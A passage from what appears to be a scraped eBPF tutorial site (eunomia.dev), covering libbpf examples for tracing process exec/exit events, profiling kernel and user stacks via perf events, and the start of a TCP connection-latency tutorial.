{\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, pid_t);\n    __type(value, u64);\n} exec_start SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nconst volatile unsigned long long min_duration_ns = 0;\n</code></pre> <p>Next, we define an eBPF program named <code>handle_exec</code> which is triggered when a process executes the <code>exec()</code> system call. First, we retrieve the PID from the current process, record the timestamp when the process starts executing, and store it in the <code>exec_start</code> map.</p> <pre><code>SEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    // ...\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    ts = bpf_ktime_get_ns();\n    bpf_map_update_elem(&amp;exec_start, &amp;pid, &amp;ts, BPF_ANY);\n\n    // ...\n}\n</code></pre> <p>Then, we reserve an event structure from the circular buffer map <code>rb</code> and fill in the relevant data, such as the process ID, parent process ID, and process name. Afterwards, we send this data to the user-mode program for processing.</p> <pre><code>    // reserve sample from BPF ringbuf\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    // fill out the sample with data\n    task = (struct task_struct *)bpf_get_current_task();\n\n    e-&gt;exit_event = false;\n    e-&gt;pid = pid;\n    e-&gt;ppid = BPF_CORE_READ(task, real_parent, tgid);\n    bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n\n    fname_off = ctx-&gt;__data_loc_filename &amp; 0xFFFF;\n    bpf_probe_read_str(&amp;e-&gt;filename, sizeof(e-&gt;filename), (void *)ctx + fname_off);\n\n    // successfully submit it to user-space for post-processing\n    bpf_ringbuf_submit(e, 0);\n    return 0;\n</code></pre> <p>Finally, we define an eBPF program named <code>handle_exit</code> that will be triggered when a process executes the <code>exit()</code> system call. First, we retrieve the PID and TID (thread ID) from the current process. If the PID and TID are not equal, it means that this is a thread exit, and we will ignore this event.</p> <pre><code>SEC(\"tp/sched/sched_process_exit\")\nint handle_exit(struct trace_event_raw_sched_process_template* ctx)\n{\n    // ...\n    id = bpf_get_current_pid_tgid();\n    pid = id &gt;&gt; 32;\n    tid = (u32)id;\n\n    /* ignore thread exits */\n    if (pid != tid)\n        return 0;\n\n    // ...\n}\n</code></pre> <p>Next, we look up the timestamp of when the process started execution, which was previously stored in the <code>exec_start</code> map. If a timestamp is found, we calculate the process's lifetime duration and then remove the record from the <code>exec_start</code> map. If a timestamp is not found and a minimum duration is specified, we return directly.</p> <pre><code>    // if we recorded start of the process, calculate lifetime duration\n    start_ts = bpf_map_lookup_elem(&amp;exec_start, &amp;pid);\n    if (start_ts)\n        duration_ns = bpf_ktime_get_ns() - *start_ts;\n    else if (min_duration_ns)\n        return 0;\n    bpf_map_delete_elem(&amp;exec_start, &amp;pid);\n\n    // if process didn't live long enough, return early\n    if (min_duration_ns &amp;&amp; duration_ns &lt; min_duration_ns)\n        return 0;\n</code></pre> <p>Then, we reserve an event structure from the circular buffer map <code>rb</code> and fill in the relevant data, such as the process ID, parent process ID, process name, and process duration. Finally, we send this data to the user-mode program for processing.</p> <pre><code>    /* reserve sample from BPF ringbuf */\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    /* fill out the sample with data */\n    task = (struct task_struct *)bpf_get_current_task();\n\n    e-&gt;exit_event = true;\n    e-&gt;duration_ns = duration_ns;```\ne-&gt;pid = pid;\ne-&gt;ppid = BPF_CORE_READ(task, real_parent, tgid);\ne-&gt;exit_code = (BPF_CORE_READ(task, exit_code) &gt;&gt; 8) &amp; 0xff;\nbpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n\n/* send data to user-space for post-processing */\nbpf_ringbuf_submit(e, 0);\nreturn 0;\n}\n</code></pre> <p>This way, when a process executes the exec() or exit() system calls, our eBPF program captures the corresponding events and sends detailed information to the user space program for further processing. This allows us to easily monitor process creation and termination and obtain detailed information about the processes.</p> <p>In addition, in the bootstrap.h file, we also define the data structures for interaction with user space:</p> <pre><code>/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */\n/* Copyright (c) 2020 Facebook */\n#ifndef __BOOTSTRAP_H\n#define __BOOTSTRAP_H\n\n#define TASK_COMM_LEN 16\n#define MAX_FILENAME_LEN 127\n\nstruct event {\n    int pid;\n    int ppid;\n    unsigned exit_code;\n    unsigned long long duration_ns;\n    char comm[TASK_COMM_LEN];\n    char filename[MAX_FILENAME_LEN];\n    bool exit_event;\n};\n\n#endif /* __BOOTSTRAP_H */\n</code></pre>"},{"location":"tutorials/11-bootstrap/#user-space-bootstrapc","title":"User space, bootstrap.c","text":"<pre><code>// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)\n/* Copyright (c) 2020 Facebook */\n#include &lt;argp.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/resource.h&gt;\n#include &lt;bpf/libbpf.h&gt;\n#include \"bootstrap.h\"\n#include \"bootstrap.skel.h\"\n\nstatic struct env {\n    bool verbose;\n    long min_duration_ms;\n} env;\n\nconst char *argp_program_version = \"bootstrap 0.0\";\nconst char *argp_program_bug_address = \"&lt;bpf@vger.kernel.org&gt;\";\nconst char argp_program_doc[] =\n\"BPF bootstrap demo application.\\n\"\n\"\\n\"\n\"It traces process start and exits and shows associated \\n\"\n\"information (filename, process duration, PID and PPID, etc).\\n\"\n\"\\n\"\n\"USAGE: ./bootstrap [-d &lt;min-duration-ms&gt;] [-v]\\n\";\n\nstatic const struct argp_option opts[] = {\n    { \"verbose\", 'v', NULL, 0, \"Verbose debug output\" },\n    { \"duration\", 'd', \"DURATION-MS\", 0, \"Minimum process duration (ms) to report\" },\n    {},\n};\n\nstatic error_t parse_arg(int key, char *arg, struct argp_state *state)\n{\n    switch (key) {\n    case 'v':\n        env.verbose = true;\n        break;\n    case 'd':\n        errno = 0;\n        env.min_duration_ms = strtol(arg, NULL, 10);\n    if (errno || env.min_duration_ms &lt;= 0) {\n    fprintf(stderr, \"Invalid duration: %s\\n\", arg);\n    argp_usage(state);\n}\nbreak;\ncase ARGP_KEY_ARG:\n    argp_usage(state);\n    break;\ndefault:\n    return ARGP_ERR_UNKNOWN;\n}\nreturn 0;\n}\n\nstatic const struct argp argp = {\n    .options = opts,\n    .parser = parse_arg,\n    .doc = argp_program_doc,\n};\n\nstatic int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)\n{\n    if (level == LIBBPF_DEBUG &amp;&amp; !env.verbose)\n        return 0;\n    return vfprintf(stderr, format, args);\n}\n\nstatic volatile bool exiting = false;\n\nstatic void sig_handler(int sig)\n{\n    exiting = true;\n}\n\nstatic int handle_event(void *ctx, void *data, size_t data_sz)\n{\n    const struct event *e = data;\n    struct tm *tm;\n    char ts[32];\n    time_t t;\n\n    time(&amp;t);\n    tm = localtime(&amp;t);\n    strftime(ts, sizeof(ts), \"%H:%M:%S\", tm);\n\n    if (e-&gt;exit_event) {\n        printf(\"%-8s %-5s %-16s %-7d %-7d [%u]\",\n               ts, \"EXIT\", e-&gt;comm, e-&gt;pid, e-&gt;ppid, e-&gt;exit_code);\n        if (e-&gt;duration_ns)\n            printf(\" (%llums)\", e-&gt;duration_ns / 1000000);\n        printf(\"\\n\");\n    } else {\n        printf(\"%-8s %-5s %-16s %-7d %-7d %s\\n\",\n               ts, \"EXEC\", e-&gt;comm, e-&gt;pid, e-&gt;ppid, e-&gt;filename);\n    }\n\n    return 0;\n}\n\nint main(int argc, char **argv)\n{\n    struct ring_buffer *rb = NULL;\n    struct bootstrap_bpf *skel;\n    int err;\n\n    /* Parse command line arguments */\n    err = argp_parse(&amp;argp, argc, argv, 0, NULL, NULL);\n    if (err)\n        return err;\n\n    /* Set up libbpf errors and debug info callback */\n    libbpf_set_print(libbpf_print_fn);\n\n    /* Cleaner handling of Ctrl-C */\n    signal(SIGINT, sig_handler);\n    signal(SIGTERM, sig_handler);\n\n    /* Load and verify BPF application */\n    skel = bootstrap_bpf__open();\n    if (!skel) {\n        fprintf(stderr, \"Failed to open and load BPF skeleton\\n\");\n        return 1;\n    }\n\n    /* Parameterize BPF code with minimum duration parameter */\n    skel-&gt;rodata-&gt;min_duration_ns = env.min_duration_ms * 1000000ULL;\n\n    /* Load &amp; verify BPF programs */\n    err = bootstrap_bpf__load(skel);\n    if (err) {\n        fprintf(stderr, \"Failed to load and verify BPF skeleton\\n\");\n        goto cleanup;\n    }\n\n    /* Attach tracepoints */\n    err = bootstrap_bpf__attach(skel);\n    if (err) {\n        fprintf(stderr, \"Failed to attach BPF skeleton\\n\");\n        goto cleanup;\n    }\n\n    /* Set up ring buffer polling */\n    rb = ring_buffer__new(bpf_map__fd(skel-&gt;maps.rb), handle_event, NULL, NULL);\n    if (!rb) {\n        err = -1;\n        fprintf(stderr, \"Failed to create ring buffer\\n\");\n        goto cleanup;\n    }\n\n    /* Process events */\n    printf(\"%-8s %-5s %-16s %-7s %-7s %s\\n\",\n        \"TIME\", \"EVENT\", \"COMM\", \"PID\", \"PPID\", \"FILENAME/EXIT CODE\");\n    while (!exiting) {\n        err = ring_buffer__poll(rb, 100 /* timeout, ms */);\n        /* Ctrl-C will cause -EINTR */\n        if (err == -EINTR) {\n            err = 0;\n            break;\n        }\n        if (err &lt; 0) {\n            printf(\"Error polling perf buffer: %d\\n\", err);\n            break;\n        }\n    }\n\ncleanup:\n    /* Clean up */\n    ring_buffer__free(rb);\n    bootstrap_bpf__destroy(skel);\n\n    return err &lt; 0 ? -err : 0;\n}\n</code></pre> <p>This user-level program is mainly used to load, verify, attach eBPF programs, and receive event data collected by eBPF programs and print it out. We will analyze some key parts.</p> <p>First, we define an env structure to store command line arguments:</p> <pre><code>static struct env {\n    bool verbose;\n    long min_duration_ms;\n} env;\n</code></pre> <p>Next, we use the argp library to parse command line arguments:</p> <pre><code>static const struct argp_option opts[] = {\n    { \"verbose\", 'v', NULL, 0, \"Verbose debug output\" },\n    { \"duration\", 'd', \"DURATION-MS\", 0, \"Minimum process duration (ms) to report\" },\n    {},\n};\n\nstatic error_t parse_arg(int key, char *arg, struct argp_state *state)\n{\n    // ...\n}\n\nstatic const struct argp argp = {\n    .options = opts,\n    .parser = parse_arg,\n    .doc = argp_program_doc,\n};\n</code></pre> <p>In the main() function, we first parse the command line arguments, and then set the libbpf print callback function libbpf_print_fn to output debug information when needed:</p> <pre><code>err = argp_parse(&amp;argp, argc, argv, 0, NULL, NULL);\nif (err)\n    return err;\nlibbpf_set_print(libbpf_print_fn);\n</code></pre> <p>Next, we open the eBPF skeleton file, pass the minimum duration parameter to the eBPF program, and load and attach the eBPF program:</p> <pre><code>skel = bootstrap_bpf__open();\nif (!skel) {\n    fprintf(stderr, \"Failed to open and load BPF skeleton\\n\");\n    return 1;\n}\n\nskel-&gt;rodata-&gt;min_duration_ns = env.min_duration_ms * 1000000ULL;\n\nerr = bootstrap_bpf__load(skel);\nif (err) {\n    fprintf(stderr, \"Failed to load and verify BPF skeleton\\n\");\n    goto cleanup;\n}\n\nerr = bootstrap_bpf__attach(skel);\nif (err) {\n    fprintf(stderr, \"Failed to attach BPF skeleton\\n\");\n    goto cleanup;\n}\n</code></pre> <p>Then, we create a ring buffer to receive event data sent by the eBPF program:</p> <pre><code>rb = ring_buffer__new(bpf_map__fd(skel-&gt;maps.rb), handle_event, NULL, NULL);\nif (!rb) {\n    err = -1;\n    fprintf(stderr, \"Failed to create ring buffer\\n\");\n    goto cleanup;\n}\n</code></pre> <p>The handle_event() function handles events received from the eBPF program. Depending on the event type (process execution or exit), it extracts and prints event information such as timestamp, process name, process ID, parent process ID, file name, or exit code.</p> <p>Finally, we use the ring_buffer__poll() function to poll the ring buffer and process the received event data:</p> <pre><code>while (!exiting) {\n    err = ring_buffer__poll(rb, 100 /* timeout, ms */);\n    // ...\n}\n</code></pre> <p>When the program receives the SIGINT or SIGTERM signal, it completes the final cleanup and exit operations, and closes and unloads the eBPF program:</p> <pre><code>cleanup:\n /* Clean up */\n ring_buffer__free(rb);\n bootstrap_bpf__destroy(skel);\n\n return err &lt; 0 ? -err : 0;\n}\n</code></pre>"},{"location":"tutorials/11-bootstrap/#dependency-installation","title":"Dependency Installation","text":"<p>Building the example requires clang, libelf, and zlib. The package names may vary in different distributions.</p> <p>On Ubuntu/Debian, you need to execute the following command:</p> <pre><code>sudo apt install clang libelf1 libelf-dev zlib1g-dev\n</code></pre> <p>On CentOS/Fedora, you need to execute the following command:</p> <pre><code>sudo dnf install clang elfutils-libelf elfutils-libelf-devel zlib-devel\n</code></pre>"},{"location":"tutorials/11-bootstrap/#compile-and-run","title":"Compile and Run","text":"<p>Compile and run the above code:</p> <pre><code>$ git submodule update --init --recursive\n$ make\n  BPF      .output/bootstrap.bpf.o\n  GEN-SKEL .output/bootstrap.skel.h\n  CC       .output/bootstrap.o\n  BINARY   bootstrap\n$ sudo ./bootstrap \n[sudo] password for yunwei: \nTIME     EVENT COMM             PID     PPID    FILENAME/EXIT CODE\n03:16:41 EXEC  sh               110688  80168   /bin/sh\n03:16:41 EXEC  which            110689  110688  /usr/bin/which\n03:16:41 EXIT  which            110689  110688  [0] (0ms)\n03:16:41 EXIT  sh               110688  80168   [0] (0ms)\".\n</code></pre> <p>The complete source code can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial</p>"},{"location":"tutorials/11-bootstrap/#summary","title":"Summary","text":"<p>Through this example, we have learned how to combine eBPF programs with user-space programs. This combination provides developers with a powerful toolkit for efficient data collection and processing across the kernel and user space. By using eBPF and libbpf, you can build more efficient, scalable, and secure monitoring and performance analysis tools.</p> <p>In the following tutorials, we will continue to explore the advanced features of eBPF and share more about eBPF development practices. Through continuous learning and practice, you will have a better understanding and mastery of eBPF technology and apply it to solve real-world problems.</p> <p>If you would like to learn more about eBPF knowledge and practices, please refer to the official documentation of eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf. You can also visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p>"},{"location":"tutorials/11-bootstrap/#reference","title":"Reference","text":"<ul> <li>Building BPF applications with libbpf-bootstrap</li> <li>https://github.com/libbpf/libbpf-bootstrap</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/11-bootstrap</p> <p>Share on  Share on </p>"},{"location":"tutorials/12-profile/","title":"eBPF Tutorial by Example 12: Using eBPF Program Profile for Performance Analysis","text":"<p>This tutorial will guide you on using libbpf and eBPF programs for performance analysis. We will leverage the perf mechanism in the kernel to learn how to capture the execution time of functions and view performance data.</p> <p>libbpf is a C library for interacting with eBPF. It provides the basic functionality for creating, loading, and using eBPF programs. In this tutorial, we will mainly use libbpf for development. Perf is a performance analysis tool in the Linux kernel that allows users to measure and analyze the performance of kernel and user space programs, as well as obtain corresponding call stacks. It collects performance data using hardware counters and software events in the kernel.</p>"},{"location":"tutorials/12-profile/#ebpf-tool-profile-performance-analysis-example","title":"eBPF Tool: profile Performance Analysis Example","text":"<p>The <code>profile</code> tool is implemented based on eBPF and utilizes the perf events in the Linux kernel for performance analysis. The <code>profile</code> tool periodically samples each processor to capture the execution of kernel and user space functions. It provides the following information for stack traces:</p> <ul> <li>Address: memory address of the function call</li> <li>Symbol: function name</li> <li>File Name: name of the source code file</li> <li>Line Number: line number in the source code</li> </ul> <p>This information helps developers locate performance bottlenecks and optimize code. Furthermore, flame graphs can be generated based on this information for a more intuitive view of performance data.</p> <p>In this example, you can compile and run it with the libbpf library (using Ubuntu/Debian as an example):</p> <p>NOTE: To compile the <code>profile</code>, you first need to install <code>Cargo</code>, as shown in \"The Cargo Book\"</p> <pre><code>$ git submodule update --init --recursive\n$ sudo apt install clang libelf1 libelf-dev zlib1g-dev\n$ make\n$ sudo ./profile \nCOMM: chronyd (pid=156) @ CPU 1\nKernel:\n  0 [&lt;ffffffff81ee9f56&gt;] _raw_spin_lock_irqsave+0x16\n  1 [&lt;ffffffff811527b4&gt;] remove_wait_queue+0x14\n  2 [&lt;ffffffff8132611d&gt;] poll_freewait+0x3d\n  3 [&lt;ffffffff81326d3f&gt;] do_select+0x7bf\n  4 [&lt;ffffffff81327af2&gt;] core_sys_select+0x182\n  5 [&lt;ffffffff81327f3a&gt;] __x64_sys_pselect6+0xea\n  6 [&lt;ffffffff81ed9e38&gt;] do_syscall_64+0x38\n  7 [&lt;ffffffff82000099&gt;] entry_SYSCALL_64_after_hwframe+0x61\nUserspace:\n  0 [&lt;00007fab187bfe09&gt;]\n  1 [&lt;000000000ee6ae98&gt;]\n\nCOMM: profile (pid=9843) @ CPU 6\nNo Kernel Stack\nUserspace:\n  0 [&lt;0000556deb068ac8&gt;]\n  1 [&lt;0000556dec34cad0&gt;]\n</code></pre>"},{"location":"tutorials/12-profile/#implementation-principle","title":"Implementation Principle","text":"<p>The <code>profile</code> tool consists of two parts: the eBPF program in kernel space and the <code>profile</code> symbol handling program in user space. The <code>profile</code> symbol handling program is responsible for loading the eBPF program and processing the data outputted by the eBPF program.</p>"},{"location":"tutorials/12-profile/#kernel-space-part","title":"Kernel Space Part","text":"<p>The implementation logic of the eBPF program in kernel space mainly relies on perf events to periodically sample the stack of the program, thereby capturing its execution flow.</p> <pre><code>// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause\n/* Copyright (c) 2022 Meta Platforms, Inc. */\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n\n#include \"profile.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} events SEC(\".maps\");\n\nSEC(\"perf_event\")\nint profile(void *ctx)\n{\n    int pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    int cpu_id = bpf_get_smp_processor_id();\n    struct stacktrace_event *event;\n    int cp;\n\n    event = bpf_ringbuf_reserve(&amp;events, sizeof(*event), 0);\n    if (!event)\n        return 1;\n\n    event-&gt;pid = pid;\n    event-&gt;cpu_id = cpu_id;\n\n    if (bpf_get_current_comm(event-&gt;comm, sizeof(event-&gt;comm)))\n        event-&gt;comm[0] = 0;\n\n    event-&gt;kstack_sz = bpf_get_stack(ctx, event-&gt;kstack, sizeof(event-&gt;kstack), 0);\n\n    event-&gt;ustack_sz = bpf_get_stack(ctx, event-&gt;ustack, sizeof(event-&gt;ustack), BPF_F_USER_STACK);\n\n    bpf_ringbuf_submit(event, 0);\n\n    return 0;\n}\n</code></pre> <p>Next, we will focus on the key part of the kernel code.</p> <ol> <li>Define eBPF maps <code>events</code>:</li> </ol> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} events SEC(\".maps\");\n</code></pre> <p>Here, a eBPF maps of type <code>BPF_MAP_TYPE_RINGBUF</code> is defined. The Ring Buffer is a high-performance circular buffer used to transfer data between the kernel and user space. <code>max_entries</code> sets the maximum size of the Ring Buffer.</p> <ol> <li>Define <code>perf_event</code> eBPF program:</li> </ol> <pre><code>SEC(\"perf_event\")\nint profile(void *ctx)\n</code></pre> <p>Here, a eBPF program named <code>profile</code> is defined, which will be executed when a perf event is triggered.</p> <ol> <li>Get process ID and CPU ID:</li> </ol> <pre><code>int pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\nint cpu_id = bpf_get_smp_processor_id();\n</code></pre> <p>The function <code>bpf_get_current_pid_tgid()</code> returns the PID and TID of the current process. By right shifting 32 bits, we get the PID. The function <code>bpf_get_smp_processor_id()</code> returns the ID of the current CPU.</p> <ol> <li>Reserve space in the Ring Buffer:</li> </ol> <pre><code>event = bpf_ringbuf_reserve(&amp;events, sizeof(*event), 0);\nif (!event)\n    return 1;\n</code></pre> <p>Use the <code>bpf_ringbuf_reserve()</code> function to reserve space in the Ring Buffer for storing the collected stack information. If the reservation fails, return an error.</p> <ol> <li>Get the current process name:</li> </ol> <pre><code>if (bpf_get_current_comm(event-&gt;comm, sizeof(event-&gt;comm)))\n    event-&gt;comm[0] = 0;\n</code></pre> <p>Use the <code>bpf_get_current_comm()</code> function to get the current process name and store it in <code>event-&gt;comm</code>.</p> <ol> <li>Get kernel stack information:</li> </ol> <pre><code>event-&gt;kstack_sz = bpf_get_stack(ctx, event-&gt;kstack, sizeof(event-&gt;kstack), 0);\n</code></pre> <p>Use the <code>bpf_get_stack()</code> function to get kernel stack information. Store the result in <code>event-&gt;kstack</code> and the size in <code>event-&gt;kstack_sz</code>.</p> <ol> <li>Get user space stack information:</li> </ol> <pre><code>event-&gt;ustack_sz = bpf_get_stack(ctx, event-&gt;ustack, sizeof(event-&gt;ustack), BPF_F_USER_STACK);\n</code></pre> <p>Using the <code>bpf_get_stack()</code> function with the <code>BPF_F_USER_STACK</code> flag retrieves information about the user space stack. Store the result in <code>event-&gt;ustack</code> and its size in <code>event-&gt;ustack_sz</code>.</p> <ol> <li>Submit the event to the Ring Buffer:</li> </ol> <pre><code>    bpf_ringbuf_submit(event, 0);\n</code></pre> <p>Finally, use the <code>bpf_ringbuf_submit()</code> function to submit the event to the Ring Buffer for the user space program to read and process.</p> <p>This kernel mode eBPF program captures the program's execution flow by sampling the kernel stack and user space stack of the program periodically. These data are stored in the Ring Buffer for the user mode <code>profile</code> program to read.</p>"},{"location":"tutorials/12-profile/#user-mode-section","title":"User Mode Section","text":"<p>This code is mainly responsible for setting up perf events for each online CPU and attaching eBPF programs:</p> <pre><code>static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid,\n                int cpu, int group_fd, unsigned long flags)\n{\n    int ret;\n\n    ret = syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);\n    return ret;\n}\n\nint main(){\n    ...\n    for (cpu = 0; cpu &lt; num_cpus; cpu++) {\n        /* skip offline/not present CPUs */\n        if (cpu &gt;= num_online_cpus || !online_mask[cpu])\n            continue;\n\n        /* Set up performance monitoring on a CPU/Core */\n        pefd = perf_event_open(&amp;attr, pid, cpu, -1, PERF_FLAG_FD_CLOEXEC);\n        if (pefd &lt; 0) {\n            fprintf(stderr, \"Fail to set up performance monitor on a CPU/Core\\n\");\n            err = -1;\n            goto cleanup;\n        }\n        pefds[cpu] = pefd;\n\n        /* Attach a BPF program on a CPU */\n        links[cpu] = bpf_program__attach_perf_event(skel-&gt;progs.profile, pefd);\n        if (!links[cpu]) {\n            err = -1;\n            goto cleanup;\n        }\n    }\n    ...\n}\n</code></pre> <p>The <code>perf_event_open</code> function is a wrapper for the perf_event_open system call. It takes a pointer to a perf_event_attr structure to specify the type and attributes of the perf event. The pid parameter is used to specify the process ID to monitor (-1 for monitoring all processes), and the cpu parameter is used to specify the CPU to monitor. The group_fd parameter is used to group perf events, and we use -1 here to indicate no grouping is needed. The flags parameter is used to set some flags, and we use PERF_FLAG_FD_CLOEXEC to ensure file descriptors are closed when executing exec series system calls.</p> <p>In the main function:</p> <pre><code>for (cpu = 0; cpu &lt; num_cpus; cpu++) {\n    // ...\n}\n</code></pre> <p>This loop sets up perf events and attaches eBPF programs for each online CPU. Firstly, it checks if the current CPU is online and skips if it's not. Then, it uses the perf_event_open() function to set up perf events for the current CPU and stores the returned file descriptor in the pefds array. Finally, it attaches the eBPF program to the perf event using the bpf_program__attach_perf_event() function. The links array is used to store the BPF links for each CPU so that they can be destroyed when the program ends.By doing so, user-mode programs set perf events for each online CPU and attach eBPF programs to these perf events to monitor all online CPUs in the system.</p> <p>The following two functions are used to display stack traces and handle events received from the ring buffer:</p> <pre><code>static void show_stack_trace(__u64 *stack, int stack_sz, pid_t pid)\n{\n    const struct blazesym_result *result;\n    const struct blazesym_csym *sym;\n    sym_src_cfg src;\n    int i, j;\n\n    if (pid) {\n        src.src_type = SRC_T_PROCESS;\n        src.params.process.pid = pid;\n    } else {\n        src.src_type = SRC_T_KERNEL;\n        src.params.kernel.kallsyms = NULL;\n        src.params.kernel.kernel_image = NULL;\n    }\n\n    result = blazesym_symbolize(symbolizer, &amp;src, 1, (const uint64_t *)stack, stack_sz);\n\n    for (i = 0; i &lt; stack_sz; i++) {\n        if (!result || result-&gt;size &lt;= i || !result-&gt;entries[i].size) {\n            printf(\"  %d [&lt;%016llx&gt;]\\n\", i, stack[i]);\n            continue;\n        }\n\n        if (result-&gt;entries[i].size == 1) {\n            sym = &amp;result-&gt;entries[i].syms[0];\n            if (sym-&gt;path &amp;&amp; sym-&gt;path[0]) {\n                printf(\"  %d [&lt;%016llx&gt;] %s+0x%llx %s:%ld\\n\",\n                       i, stack[i], sym-&gt;symbol,\n                       stack[i] - sym-&gt;start_address,\n                       sym-&gt;path, sym-&gt;line_no);\n            } else {\n                printf(\"  %d [&lt;%016llx&gt;] %s+0x%llx\\n\",\n                       i, stack[i], sym-&gt;symbol,\n                       stack[i] - sym-&gt;start_address);\n            }\n            continue;\n        }\n\n        printf(\"  %d [&lt;%016llx&gt;]\\n\", i, stack[i]);\n        for (j = 0; j &lt; result-&gt;entries[i].size; j++) {\n            sym = &amp;result-&gt;entries[i].syms[j];\n            if (sym-&gt;path &amp;&amp; sym-&gt;path[0]) {\n                printf(\"        %s+0x%llx %s:%ld\\n\",\n                       sym-&gt;symbol, stack[i] - sym-&gt;start_address,\n                       sym-&gt;path, sym-&gt;line_no);\n            } else {\n                printf(\"        %s+0x%llx\\n\", sym-&gt;symbol,\n                       stack[i] - sym-&gt;start_address);\n            }\n        }\n    }\n\n    blazesym_result_free(result);\n}\n\n/* Receive events from the ring buffer. */\nstatic int event_handler(void *_ctx, void *data, size_t size)\n{\n    struct stacktrace_event *event = data;\n\n    if (event-&gt;kstack_sz &lt;= 0 &amp;&amp; event-&gt;ustack_sz &lt;= 0)\n        return 1;\n\n    printf(\"COMM: %s (pid=%d) @ CPU %d\\n\", event-&gt;comm, event-&gt;pid, event-&gt;cpu_id);\n\n    if (event-&gt;kstack_sz &gt; 0) {\n        printf(\"Kernel:\\n\");\n        show_stack_trace(event-&gt;kstack, event-&gt;kstack_sz / sizeof(__u64), 0);\n    } else {\n        printf(\"No Kernel Stack\\n\");\n    }\n\n    if (event-&gt;ustack_sz &gt; 0) {\n        printf(\"Userspace:\\n\");\n        show_stack_trace(event-&gt;ustack, event-&gt;ustack_sz / sizeof(__u64), event-&gt;pid);\n    } else {\n        printf(\"No Userspace Stack\\n\");\n    }\n\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre> <p>The <code>show_stack_trace()</code> function is used to display the stack trace of the kernel or userspace. It takes a <code>stack</code> parameter, which is a pointer to the kernel or userspace stack, and a <code>stack_sz</code> parameter, which represents the size of the stack. The <code>pid</code> parameter represents the ID of the process to be displayed (set to 0 when displaying the kernel stack). In the function, the source of the stack (kernel or userspace) is determined based on the <code>pid</code> parameter, and then the <code>blazesym_symbolize()</code> function is called to resolve the addresses in the stack to symbol names and source code locations. Finally, the resolved results are traversed and the symbol names and source code location information are outputted.</p> <p>The <code>event_handler()</code> function is used to handle events received from the ring buffer. It takes a <code>data</code> parameter, which points to the data in the ring buffer, and a <code>size</code> parameter, which represents the size of the data. The function first converts the <code>data</code> pointer to a pointer of type <code>stacktrace_event</code>, and then checks the sizes of the kernel and userspace stacks. If the stacks are empty, it returns directly. Next, the function outputs the process name, process ID, and CPU ID information. Then it displays the stack traces of the kernel and userspace respectively. When calling the <code>show_stack_trace()</code> function, the addresses, sizes, and process ID of the kernel and userspace stacks are passed in separately.</p> <p>These two functions are part of the eBPF profiling tool, used to display and process stack trace information collected by eBPF programs, helping users understand program performance and bottlenecks.</p>"},{"location":"tutorials/12-profile/#summary","title":"Summary","text":"<p>Through this introductory tutorial on eBPF, we have learned how to use eBPF programs for performance analysis. In this process, we explained in detail how to create eBPF programs, monitor process performance, and retrieve data from the ring buffer for analyzing stack traces. We also learned how to use the <code>perf_event_open()</code> function to set up performance monitoring and attach BPF programs to performance events. In this tutorial, we also demonstrated how to write eBPF programs to capture the kernel and userspace stack information of processes in order to analyze program performance bottlenecks. With this example, you can understand the powerful features of eBPF in performance analysis.</p> <p>If you want to learn more about eBPF knowledge and practices, please refer to the official documentation of eunomia-bpf: https://github.com/eunomia-bpf/eunomia-bpf. You can also visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>The next tutorial will further explore advanced features of eBPF. We will continue to share more content about eBPF development practices to help you better understand and master eBPF technology. We hope these contents will be helpful for your learning and practice on the eBPF development journey.</p> <p>The original link of this article: https://eunomia.dev/tutorials/12-profile</p> <p>Share on  Share on </p>"},{"location":"tutorials/13-tcpconnlat/","title":"eBPF Tutorial by Example 13: Statistics of TCP Connection Delay with libbpf","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool used in the Linux kernel. eBPF allows developers to dynamically load, update, and run user-defined code without restarting the kernel or changing the kernel source code.</p> <p>This article is the thirteenth installment of the eBPF Tutorial by Example, mainly about how to use eBPF to statistics TCP connection delay and process data in user space using libbpf.</p>"},{"location":"tutorials/13-tcpconnlat/#background","title":"Background","text":"<p>When developing backends, regardless of the programming language used, we often need to call databases such as MySQL and Redis, perform RPC remote calls, or call other RESTful APIs. The underlying implementation of these calls is usually based on the TCP protocol. This is because TCP protocol has advantages such as reliable connection, error retransmission, congestion control, etc., so TCP is more widely used in network transport layer protocols than UDP. However, TCP also has some drawbacks, such as longer connection establishment delay. Therefore, some alternative solutions have emerged, such as QUIC (Quick 